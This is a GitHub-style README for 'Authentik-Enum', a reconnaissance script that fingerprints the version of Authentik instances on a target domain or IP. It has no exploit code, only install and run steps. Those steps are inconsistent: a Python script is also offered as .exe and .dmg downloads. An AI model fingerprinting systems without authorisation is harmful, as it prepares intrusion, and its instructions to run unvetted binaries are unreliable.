# 🔍 Authentik-Enum - Easily Identify Authentik Versions

[![Download Authentik-Enum](https://img.shields.io/badge/Download%20Now-Authentik--Enum-brightgreen)](https://github.com/komaxdj/Authentik-Enum/releases)

## 🚀 Getting Started

Authentik-Enum is a simple Python script designed to help you identify versions of Authentik software. This tool can assist security professionals and enthusiasts in their reconnaissance efforts. By using it, you can gather useful information without needing extensive technical skills.

## 📋 System Requirements

To run Authentik-Enum, ensure that your computer meets the following requirements:

- Operating System: Windows, macOS, or a Linux distribution.
- Python 3.7 or higher installed on your machine.
- Basic command line knowledge to execute the script.

## 📥 Download & Install

1. **Visit the Download Page**
   Go to the [Releases page](https://github.com/komaxdj/Authentik-Enum/releases) to access the latest version of Authentik-Enum.

2. **Choose the Right File**
   On the Releases page, you will see the latest release. Look for a file suitable for your operating system:
   - For Windows, download the `.exe` file.
   - For macOS, download the `.dmg` file.
   - For Linux, download the `.tar.gz` file.

3. **Download the File**
   Click on the file link to start downloading. Depending on your browser settings, your file may save automatically to your downloads folder or ask you where to save it.

4. **Install the Tool**
   - **Windows:** Double-click the `.exe` file and follow the installation prompts.
   - **macOS:** Open the downloaded `.dmg` file and drag the Authentik-Enum icon into your Applications folder.
   - **Linux:** Extract the contents of the `.tar.gz` file into a directory of your choice.

5. **Install Dependencies**
   Authentik-Enum requires additional Python packages. Open your command line tool (Command Prompt on Windows, Terminal on macOS and Linux) and navigate to the folder where you installed Authentik-Enum. Run the following command:
   ```
   pip install -r requirements.txt
   ```

## 🛠️ Running the Script

After you have installed Authentik-Enum and its dependencies, follow these steps to run the script:

1. Open your command line tool again.
2. Navigate to the directory where Authentik-Enum is located. Use the `cd` command followed by the folder path.
3. Execute the script using the following command:
   ```
   python authentik_enum.py [your_target]
   ```
   Replace `[your_target]` with the domain or IP address of the Authentik instance you want to enumerate.

## 💡 How to Use Authentik-Enum

Once you run the script, Authentik-Enum will automatically start gathering information about the Authentik version. Here’s what to expect from the tool:

- **Version Information:** The script will provide details on the Authentik version being used.
- **OSINT Features:** Authentik-Enum has features that enable passive reconnaissance, gathering valuable data with minimal intrusion.
- **Results Display:** The output will show the findings directly in the command line, giving you insights into the target system.

## 🔍 Understanding Output

After the script finishes running, you will see the results in the terminal. Here's how to interpret the information:

- Look for the "Version Found" line to confirm the Authentik version.
- Any warnings or errors will appear in red text, indicating issues that may need attention.

## ❓ Troubleshooting

If you encounter issues while running Authentik-Enum, consider these common problems:

- **Python Not Found:** Ensure Python is installed correctly and added to your system PATH. 
- **Permission Errors:** On macOS and Linux, you may need to run the command with `sudo` if you face permission issues.
- **Missing Dependencies:** Make sure you have installed all required packages mentioned in the `requirements.txt` file.

## 🔗 Helpful Links

For more information, feel free to check out the following resources:

- [GitHub Repository](https://github.com/komaxdj/Authentik-Enum) for updates and issue reporting.
- [Python Official Website](https://www.python.org) for Python installation instructions.

## 📧 Support

If you need further assistance, consider reaching out through the GitHub issues page. The community is here to help you troubleshoot problems and enhance your experience using Authentik-Enum.

Enjoy using Authentik-Enum, and happy enumerating!